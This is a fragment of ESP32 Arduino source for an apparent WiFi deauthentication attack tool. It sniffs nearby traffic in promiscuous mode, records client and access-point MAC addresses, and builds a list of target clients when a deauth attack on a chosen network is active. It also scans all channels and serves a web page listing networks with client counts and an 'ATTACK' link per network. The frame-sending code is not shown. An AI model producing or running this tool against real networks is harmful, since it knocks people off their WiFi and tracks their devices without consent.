// ===== SNIFFER (combined scan + deauth) =====
void snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type){
  if(type!=WIFI_PKT_MGMT && type!=WIFI_PKT_DATA) return;
  
  uint8_t *p=((wifi_promiscuous_pkt_t*)buf)->payload;
  uint8_t *src=p+10, *dst=p+4, *bssid=p+16;
  uint8_t *clientMac=nullptr, *apMac=nullptr;

  if(memcmp(src,bssid,6)==0){clientMac=dst;apMac=bssid;}
  else if(memcmp(dst,bssid,6)==0){clientMac=src;apMac=bssid;}

  if(clientMac&&apMac){
    if(clientMac[0]==0xFF&&clientMac[1]==0xFF) return;
    if(clientMac[0]==0x33&&clientMac[1]==0x33) return;

    // Global list (for scan display)
    bool exists=false;
    for(int i=0;i<globalSniffedCount;i++){
      if(memcmp(globalSniffedClients[i].client,clientMac,6)==0){exists=true;break;}
    }
    if(!exists&&globalSniffedCount<50){
      memcpy(globalSniffedClients[globalSniffedCount].client,clientMac,6);
      memcpy(globalSniffedClients[globalSniffedCount].bssid,apMac,6);
      globalSniffedCount++;
    }

    // Deauth target clients
    if(isDeauthing&&memcmp(apMac,targetBSSID,6)==0){
      bool ex=false;
      for(int i=0;i<capturedClientCount;i++){
        if(memcmp(capturedClients[i],clientMac,6)==0){ex=true;break;}
      }
      if(!ex&&capturedClientCount<20){
        memcpy(capturedClients[capturedClientCount],clientMac,6);
        capturedClientCount++;
      }
    }
  }
}

// ===== SCAN (with client counting) =====
void startWiFiScan(){
  Serial.println("[*] Scanning & Sniffing Clients...");
  WiFi.mode(WIFI_AP_STA);WiFi.disconnect(true);delay(100);

  globalSniffedCount=0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);

  networkCount=WiFi.scanNetworks(false,true);

  // Store results immediately
  if(networkCount>0){
    for(int i=0;i<networkCount&&i<20;i++){
      scannedNetworks[i].ssid=WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid,WiFi.BSSID(i),6);
      scannedNetworks[i].channel=WiFi.channel(i);
      scannedNetworks[i].rssi=WiFi.RSSI(i);
    }
  }

  // Extra per-channel sniffing for accurate counts
  Serial.println("[*] Extra sniffing 1-13...");
  for(int c=1;c<=13;c++){
    esp_wifi_set_channel(c,WIFI_SECOND_CHAN_NONE);
    delay(300);
  }

  esp_wifi_set_promiscuous(false);delay(50);
  WiFi.mode(WIFI_AP);delay(50);

  // Build HTML with client counts
  networkListHTML="";
  if(networkCount>0){
    for(int i=0;i<networkCount&&i<20;i++){
      int cCount=0;
      for(int j=0;j<globalSniffedCount;j++){
        if(memcmp(scannedNetworks[i].bssid,globalSniffedClients[j].bssid,6)==0) cCount++;
      }
      String s=scannedNetworks[i].ssid;
      if(s.length()==0) s="<i>Hidden</i>";
      s.replace("<","&lt;");s.replace(">","&gt;");
      String cc=cCount>0?"#0f0":"#666";
      String rc="#0f0";
      if(scannedNetworks[i].rssi<-50) rc="#ff0";
      if(scannedNetworks[i].rssi<-65) rc="#f80";
      if(scannedNetworks[i].rssi<-75) rc="#f00";
      networkListHTML+="<tr><td>["+String(i)+"]</td>";
      networkListHTML+="<td style='text-align:left;'><b>"+s+"</b>";
      networkListHTML+="<br><span style='color:#666;font-size:11px;'>Ch:"+String(scannedNetworks[i].channel);
      networkListHTML+=" | <span style='color:"+rc+";'>"+String(scannedNetworks[i].rssi)+"dBm</span></span></td>";
      networkListHTML+="<td><b style='color:"+cc+";'>"+String(cCount)+"</b></td>";
      networkListHTML+="<td><a href='/deauth?idx="+String(i)+"' class='btn-attack'>ATTACK</a></td></tr>";
    }
  } else networkListHTML="<tr><td colspan='4'>No networks!</td></tr>";
  scanExecuted=true;
  Serial.printf("[*] Done: %d networks, %d clients\n",networkCount,globalSniffedCount);
}

